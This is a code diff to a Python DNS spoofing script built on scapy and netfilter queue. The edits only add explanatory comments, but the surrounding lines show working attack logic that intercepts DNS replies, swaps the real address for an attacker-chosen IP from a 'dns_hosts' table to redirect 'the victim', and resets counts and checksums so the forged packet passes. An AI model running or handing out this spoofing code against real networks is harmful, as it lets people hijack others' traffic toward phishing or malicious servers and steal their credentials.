@@ -176,7 +176,7 @@ def dns_spoof():
 def process_packet(packet):
     # Convert netfilter queue packet to scapy packet.
     scapy_packet = IP(packet.get_payload())
-    if scapy_packet.haslayer(DNSRR):
+    if scapy_packet.haslayer(DNSRR): # DNSRR: DNS Resource Record
         # If the packet is a DNS Resource Record (DNS reply), we modify the packet using the modify_packet() method.
         # Print summary of packet before modifying it.
         print("[Before]:", scapy_packet.summary())
@@ -199,7 +199,7 @@ def process_packet(packet):
 # When we see an "url_webpage" reply, the real IP address in the packet gets replaced with the IP address "ip_dns_spoof."
 def modify_packet(packet):
     # We obtain the DNS domain name of the DNS request.
-    qname = packet[DNSQR].qname
+    qname = packet[DNSQR].qname # DNSQR: DNS Question Record
     if qname not in dns_hosts:
         # If the website/domain name is not in our dictionary "dns_hosts", we do not modify the packet.
         # We simply return the packet unmodified.
@@ -209,7 +209,7 @@ def modify_packet(packet):
     # Hence we craft a new reply packet overriding the original reply.
     # We set the rdata for the IP we want to redirect the victim to.
     # So if qname == url_webpage, then url_webpage will be mapped to the corresponding spoofing IP address "ip_dns_spoof" from the dictionary "dns_hosts".
-    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
+    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname]) # rrname: record name, rdata: record data
     # set the answer count to 1, indicating that the number of items in the answer section is equal to 1.
     packet[DNS].ancount = 1
     # We delete the checksums and the length of the packet. This is needed because the checksum and the length of the packet have changed due to modification of the packet.
